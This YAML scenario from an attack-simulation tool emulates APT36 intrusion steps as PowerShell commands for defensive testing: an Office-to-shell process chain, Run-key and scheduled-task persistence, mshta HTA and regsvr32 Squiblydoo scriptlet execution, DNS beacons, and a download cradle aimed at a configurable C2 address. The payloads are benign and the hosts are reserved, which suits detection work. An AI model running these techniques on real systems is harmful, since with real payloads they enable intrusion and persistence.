id: apt36-kill-chain
name: APT36 Kill Chain (Three-Tier)
description: >
  Campaign-grade adversary emulation of APT36 (Transparent Tribe / PROJECTM) —
  a Pakistani nexus threat actor with documented targeting of Indian BFSI,
  government, and defence organisations.

  TIERS:
  - Posture (default, safe anywhere): validates defences across prevention and
    detection layers — macro controls, Protected View, MOTW, AMSI, Office child-
    process ASR, COM-abuse restrictions, ScriptBlock logging, Sysmon, persistence
    indicators, and browser credential exposure. Split into prevention-posture and
    detection-posture categories so the UI can distinguish "attack blocked" from
    "attack detectable".
  - Telemetry (opt-in, production-safe under approval): real, data/identity-safe
    technique execution — authentic winword.exe→powershell.exe child chain, Run-key
    write+delete (EID 4657/Sysmon 13), localhost template-fetch (EID 4688), and
    deterministic DNS beacon (bas-telemetry-<runid>.invalid → nslookup). Generates
    real EDR/SIEM/Sysmon telemetry; no credential access, no persistence, no real
    network egress.
  - Lab (opt-in, isolated range only): full-fidelity APT36 tradecraft — mshta HTA
    chain, scheduled-task persistence, DNS TXT beacon, BAS listener C2 simulation.
    Triggers EDR by design. Isolated range with snapshot only.

  GUARDRAILS: no domain-controller interlock (workstation campaign); optional
  execution window; BAS execution markers (BAS_RUN_ID env + [BAS-SIM] command-line
  tag) on every step to distinguish authorised simulation from real intrusion.

  Per-OS: Windows only. Linux/macOS report "not applicable".
  SAFETY: telemetry mode has no real network egress; lab mode uses localhost/RFC5737
  BAS listener only (never internet destinations).
author: Audspect Research
executable: true
local_check: true
tags:
  - apt36
  - transparent-tribe
  - spearphish
  - bfsi
  - india
  - initial-access
  - execution
  - persistence
  - credential-access
  - hybrid
  - campaign
mitre_phases:
  - initial-access
  - execution
  - persistence
  - credential-access
  - command-and-control

live_policy:
  block_on_domain_controller: false
  require_dc_reachable: false
  max_spray_attempts: 0
  spray_account_allowlist: []
  execution_window: ""   # optional "HH:MM-HH:MM" local-time gate

# Posture checks are handled by apt36KillChainChecks() in the agent (local_check path).
# Lab steps (schtasks persistence, mshta chain, DNS TXT, C2 listener) are added in Portion 3.
steps:
  - name: "Office Child Process Chain (winword.exe → powershell.exe)"
    technique_id: T1566.001
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Copies cmd.exe to a temp winword.exe, spawns powershell.exe with a benign exit, deletes the copy. No real macro or document."
    reversible: true
    telemetry:
      - "Sysmon EID 1 (process create): Image=powershell.exe, ParentImage=%TEMP%\\winword.exe"
      - "Security EID 4688 (process create with command line) if process auditing enabled"
    detection:
      - "EDR: Office process (winword.exe) spawning a shell — primary APT36 initial-access detection signal"
      - "SIEM: parent-child rule winword.exe → powershell.exe / cmd.exe"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $tmp = Join-Path $env:TEMP 'winword.exe'
      Copy-Item "$env:SystemRoot\System32\cmd.exe" $tmp -Force
      $psi = New-Object System.Diagnostics.ProcessStartInfo
      $psi.FileName = $tmp
      $psi.Arguments = '/c powershell.exe -NoProfile -NonInteractive -Command "Write-Output BAS-SIM-T1566"'
      $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
      $psi.CreateNoWindow = $true
      $p = [System.Diagnostics.Process]::Start($psi)
      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      if ($ec -ge 0) {
        Write-Output "EXEC: winword.exe->powershell.exe child-process chain fired (exit $ec) — expect Sysmon EID 1 with ParentImage=winword.exe. Benign payload only. [BAS-SIM]"
      } else {
        Write-Output "PASS: child process could not be started — AppLocker/WDAC/EDR blocked Office process spawning (good)."
      }
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'winword.exe') -Force -ErrorAction SilentlyContinue

  - name: "Template Injection Probe (localhost fetch)"
    technique_id: T1221
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Single HTTP GET to 127.0.0.1 only — no real network egress, no remote server contacted."
    reversible: true
    telemetry:
      - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
      - "Network connection event: 127.0.0.1:80 — connection refused is expected and harmless"
    detection:
      - "EDR: PowerShell making network connection shortly after Office child process spawn"
      - "SIEM: HTTP outbound correlated with T1566.001 step above"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $uri = 'http://127.0.0.1/bas-template-probe'
      try {
        $r = Invoke-WebRequest -Uri $uri -TimeoutSec 2 -ErrorAction Stop
        Write-Output "EXEC: template-fetch probe to $uri succeeded (status $($r.StatusCode)) — network telemetry generated. [BAS-SIM]"
      } catch {
        Write-Output "EXEC: template-fetch probe to $uri attempted (connection refused — expected, no listener running) — expect EID 4688 + network event. [BAS-SIM]"
      }
    cleanup: ""

  - name: "Keylogger Hook-Monitoring Probe (API surface check)"
    technique_id: T1056.001
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Enumerates loaded DLLs in current process to check hook-monitoring coverage. No hook installed; no keystrokes captured."
    reversible: true
    telemetry:
      - "Security EID 4688 (PowerShell process with module-enumeration command line)"
    detection:
      - "EDR: process enumerating its own loaded modules — visibility check; real hook install is lab-only"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $proc   = [System.Diagnostics.Process]::GetCurrentProcess()
      $loaded = @($proc.Modules | Select-Object -ExpandProperty ModuleName | ForEach-Object { $_.ToLower() })
      $user32 = $loaded -contains 'user32.dll'
      $edrPatterns = @('mfehidk','cyoptics','epdrv','atrsdfw','cbk7','cbstream','psinject','hmpalert','amsi')
      $edrMods = @($loaded | Where-Object { $m = $_; ($edrPatterns | Where-Object { $m -match $_ }).Count -gt 0 })
      $edrStr  = if ($edrMods.Count -gt 0) { $edrMods -join ',' } else { 'none detected' }
      if ($user32) {
        Write-Output "EXEC: user32.dll loaded — SetWindowsHookEx API reachable from this process. EDR/AMSI hook-monitoring modules: $edrStr. Real keyboard-hook install is lab-only. [BAS-SIM]"
      } else {
        Write-Output "PASS: user32.dll not in current process space — keyboard-hook API surface not directly reachable."
      }
    cleanup: ""

  - name: "Registry Run Key Persistence (write + delete)"
    technique_id: T1547.001
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Writes then immediately deletes a HKCU Run and RunOnce entry. Value is a benign string; no executable is written."
    reversible: true
    telemetry:
      - "Security EID 4657 (registry value set) for HKCU\\...\\Run and RunOnce"
      - "Sysmon EID 13 (registry value set) with Image=powershell.exe, TargetObject=...\\Run\\BAS-SIM-APT36-Persist"
    detection:
      - "SIEM: Run/RunOnce key modification by a non-installer process — APT36 persistence signal"
      - "EDR: registry persistence write from powershell.exe with no corresponding installer activity"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runKey     = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
      $runOnceKey = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
      $name = 'BAS-SIM-APT36-Persist'
      $val  = 'BAS-SIM T1547.001 persistence probe — auto-removed'
      Set-ItemProperty -Path $runKey     -Name $name -Value $val -ErrorAction SilentlyContinue
      Set-ItemProperty -Path $runOnceKey -Name $name -Value $val -ErrorAction SilentlyContinue
      $runOk     = (Get-ItemProperty -Path $runKey     -Name $name -ErrorAction SilentlyContinue).$name -eq $val
      $runOnceOk = (Get-ItemProperty -Path $runOnceKey -Name $name -ErrorAction SilentlyContinue).$name -eq $val
      Remove-ItemProperty -Path $runKey     -Name $name -ErrorAction SilentlyContinue
      Remove-ItemProperty -Path $runOnceKey -Name $name -ErrorAction SilentlyContinue
      if ($runOk -or $runOnceOk) {
        Write-Output "EXEC: Run=$runOk RunOnce=$runOnceOk — registry persistence probe written and deleted. Expect Sysmon EID 13 + Security EID 4657. No entry remains. [BAS-SIM]"
      } else {
        Write-Output "PASS: could not write to HKCU Run/RunOnce keys — registry write blocked (restricted token / AppLocker / policy)."
      }
    cleanup: |
      Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'     -Name 'BAS-SIM-APT36-Persist' -ErrorAction SilentlyContinue
      Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'BAS-SIM-APT36-Persist' -ErrorAction SilentlyContinue

  - name: "C2 DNS Beacon (deterministic .invalid query)"
    technique_id: T1071.001
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "nslookup to a .invalid RFC 2606 reserved domain — guaranteed non-routable; DNS query goes to corporate resolver only, never to the internet."
    reversible: true
    telemetry:
      - "Sysmon EID 22 (DNS query event) for bas-telemetry-<id>.invalid"
      - "Security EID 4688 (nslookup.exe with beacon domain as argument)"
      - "Corporate DNS server log: NXDOMAIN for bas-telemetry-*.invalid"
    detection:
      - "SIEM: DNS query for .invalid TLD from endpoint — deterministic BAS beacon; correlate run ID across all events in this run"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0, [Math]::Min(8, $env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $beacon = "bas-telemetry-$runId.invalid"
      nslookup $beacon 2>&1 | Out-Null
      Write-Output "EXEC: DNS beacon '$beacon' queried — expect Sysmon EID 22 + nslookup EID 4688. NXDOMAIN response expected. Use run-id '$runId' for SIEM correlation across this scenario run. [BAS-SIM]"
    cleanup: ""

  # ── Lab-only steps ─────────────────────────────────────────────────────────
  # fidelity: lab-only  →  skipped in telemetry mode; requires confirmLab + isolated range

  - name: "Scheduled Task Persistence (lab — create + delete)"
    technique_id: T1053.005
    framework: custom
    executor: powershell
    timeout_sec: 45
    fidelity: lab-only
    production_safe: false
    risk: medium
    blast_radius: "Creates a scheduled task with a benign powershell.exe action then immediately removes it. Generates EID 4698+4699. Task never actually triggers."
    reversible: true
    telemetry:
      - "Security EID 4698 (scheduled task created)"
      - "Security EID 4699 (scheduled task deleted)"
      - "Sysmon EID 1 (schtasks.exe process create)"
    detection:
      - "SIEM: schtask creation from a non-installer process; APT36 names tasks to mimic system tasks"
      - "EDR: Register-ScheduledTask via powershell.exe — no MSI or update context"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $taskName = 'BAS-SIM-APT36-WindowsUpdate'
      $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -NonInteractive -Command "Write-Output BAS-SIM-T1053"'
      $trigger  = New-ScheduledTaskTrigger -AtLogOn
      Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Limited -Force -ErrorAction SilentlyContinue | Out-Null
      $created  = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
      if ($created) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $gone = -not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
        Write-Output "FAIL: scheduled task '$taskName' created and removed (cleanup verified=$gone) — expect EID 4698+4699. APT36-style schtask persistence not blocked. [BAS-SIM]"
      } else {
        Write-Output "PASS: scheduled task creation blocked — AppLocker / restricted token / policy prevented APT36 persistence mechanism."
      }
    cleanup: |
      Unregister-ScheduledTask -TaskName 'BAS-SIM-APT36-WindowsUpdate' -Confirm:$false -ErrorAction SilentlyContinue

  - name: "mshta HTA Dropper Chain (lab — VBScript + cmd.exe spawn)"
    technique_id: T1218.005
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: lab-only
    production_safe: false
    risk: high
    blast_radius: "Writes a benign .hta to %TEMP%, executes via mshta.exe — spawns cmd.exe /c echo as a child (no payload). File deleted on completion. Triggers EDR by design."
    reversible: true
    telemetry:
      - "Sysmon EID 11 (file create): bas_sim_apt36.hta in %TEMP%"
      - "Sysmon EID 1 (process create): mshta.exe with HTA path as argument"
      - "Sysmon EID 1 (process create): cmd.exe with ParentImage=mshta.exe"
      - "Security EID 4688 for both mshta.exe and cmd.exe"
    detection:
      - "EDR: mshta.exe spawning cmd.exe — canonical APT36 HTA dropper detection signal"
      - "SIEM: mshta.exe executing a file from %TEMP% — high-fidelity APT36 initial-access indicator"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $hta = Join-Path $env:TEMP 'bas_sim_apt36.hta'
      $htaContent = '<html><head></head><body onload="vbscript:CreateObject(''WScript.Shell'').Run ''cmd.exe /c echo BAS-SIM-T1218.005'',0,True:window.close"></body></html>'
      [System.IO.File]::WriteAllText($hta, $htaContent, [System.Text.Encoding]::UTF8)
      if (-not (Test-Path $hta)) { Write-Output "PASS: HTA file write blocked — execution surface restricted."; return }
      $p = Start-Process 'mshta.exe' -ArgumentList "`"$hta`"" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
      Remove-Item $hta -Force -ErrorAction SilentlyContinue
      $cleaned = -not (Test-Path $hta)
      if ($ec -ge 0) {
        Write-Output "FAIL: mshta.exe HTA chain executed (exit $ec, artifact cleaned=$cleaned) — APT36 HTA dropper vector not blocked. Expect Sysmon EID 1 mshta->cmd. [BAS-SIM]"
      } else {
        Write-Output "PASS: mshta.exe execution blocked — AppLocker / ASR rule / WDAC prevented HTA dropper execution (artifact cleaned=$cleaned)."
      }
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.hta') -Force -ErrorAction SilentlyContinue

  - name: "regsvr32 Squiblydoo SCT Chain (lab — JScript + cmd.exe spawn)"
    technique_id: T1218.010
    framework: custom
    executor: powershell
    timeout_sec: 30
    fidelity: lab-only
    production_safe: false
    risk: high
    blast_radius: "Writes a benign .sct scriptlet to %TEMP%, executes via regsvr32 /i scrobj.dll — spawns cmd.exe /c echo as child. File deleted on completion. Triggers EDR by design."
    reversible: true
    telemetry:
      - "Sysmon EID 11 (file create): bas_sim_apt36.sct in %TEMP%"
      - "Sysmon EID 7 (image load): scrobj.dll loaded by regsvr32.exe"
      - "Sysmon EID 1 (process create): regsvr32.exe with /i:path scrobj.dll"
      - "Sysmon EID 1 (process create): cmd.exe with ParentImage=regsvr32.exe"
    detection:
      - "EDR: regsvr32.exe loading scrobj.dll and spawning cmd.exe — Squiblydoo detection signature"
      - "SIEM: regsvr32.exe with /i: argument referencing a %TEMP% file"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sct = Join-Path $env:TEMP 'bas_sim_apt36.sct'
      $sctContent = '<?XML version="1.0"?><scriptlet><registration progid="BAS" classid="{11111111-1111-1111-1111-111111111111}"><script language="JScript"><![CDATA[new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo BAS-SIM-T1218.010",0,true);]]></script></registration></scriptlet>'
      [System.IO.File]::WriteAllText($sct, $sctContent, [System.Text.Encoding]::UTF8)
      if (-not (Test-Path $sct)) { Write-Output "PASS: SCT file write blocked — execution surface restricted."; return }
      $p = Start-Process 'regsvr32.exe' -ArgumentList "/s /n /u /i:`"$sct`" scrobj.dll" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
      Remove-Item $sct -Force -ErrorAction SilentlyContinue
      $cleaned = -not (Test-Path $sct)
      if ($ec -ge 0) {
        Write-Output "FAIL: regsvr32 Squiblydoo executed (exit $ec, artifact cleaned=$cleaned) — scrobj.dll chain not blocked. Expect Sysmon EID 7 scrobj.dll + EID 1 cmd.exe. [BAS-SIM]"
      } else {
        Write-Output "PASS: regsvr32 execution blocked — AppLocker / WDAC / ASR rule prevented Squiblydoo SCT chain (artifact cleaned=$cleaned)."
      }
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.sct') -Force -ErrorAction SilentlyContinue

  - name: "C2 DNS TXT Beacon (lab — CrimsonRAT channel registration)"
    technique_id: T1071.004
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: lab-only
    production_safe: false
    risk: low
    blast_radius: "DNS TXT query to bas-c2-<runid>.invalid — .invalid is RFC 2606 reserved, guaranteed NXDOMAIN. No real C2 contacted."
    reversible: true
    telemetry:
      - "Sysmon EID 22 (DNS query): TXT record query for bas-c2-<id>.invalid"
      - "Corporate DNS server log: NXDOMAIN for bas-c2-*.invalid"
    detection:
      - "SIEM: DNS TXT query from endpoint — CrimsonRAT uses TXT records for C2 channel registration; correlate with run ID"
      - "NDR: unusual DNS TXT query volume from workstation to external resolver"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0, [Math]::Min(8, $env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
      $beacon = "bas-c2-$runId.invalid"
      Resolve-DnsName -Name $beacon -Type TXT -ErrorAction SilentlyContinue | Out-Null
      Write-Output "EXEC: DNS TXT beacon '$beacon' queried — expect Sysmon EID 22 (TXT type). NXDOMAIN is expected. CrimsonRAT uses TXT records for C2 registration — use '$runId' to correlate across this run. [BAS-SIM]"
    cleanup: ""

  - name: "Download Cradle (lab — BAS listener / RFC5737 isolated)"
    technique_id: T1105
    framework: custom
    executor: powershell
    timeout_sec: 20
    fidelity: lab-only
    production_safe: false
    risk: medium
    blast_radius: "Invoke-WebRequest to BAS_C2_URI env var, or RFC5737 TEST-NET-1 (192.0.2.1) if unset — no real internet egress. Connection timeout is expected without a BAS listener."
    reversible: true
    telemetry:
      - "Sysmon EID 3 (network connection): powershell.exe to configured BAS listener or 192.0.2.1"
      - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
    detection:
      - "EDR: PowerShell download cradle shortly after LOLBin execution — APT36 RAT delivery follow-on"
      - "SIEM: outbound HTTP from powershell.exe; correlate source IP + run ID"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $uri = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://192.0.2.1/bas-c2-payload' }
      try {
        $r    = Invoke-WebRequest -Uri $uri -TimeoutSec 3 -ErrorAction Stop
        $size = $r.Content.Length
        Write-Output "EXEC: download cradle to '$uri' returned $size bytes — BAS listener responded. Expect Sysmon EID 3 network event. Set BAS_C2_URI to isolated BAS listener for full fidelity. [BAS-SIM]"
      } catch {
        Write-Output "EXEC: download cradle to '$uri' attempted (timeout/refused — expected without listener) — expect Sysmon EID 3 outbound attempt. Set BAS_C2_URI=http://<isolated-listener>/path for full simulation. [BAS-SIM]"
      }
    cleanup: ""
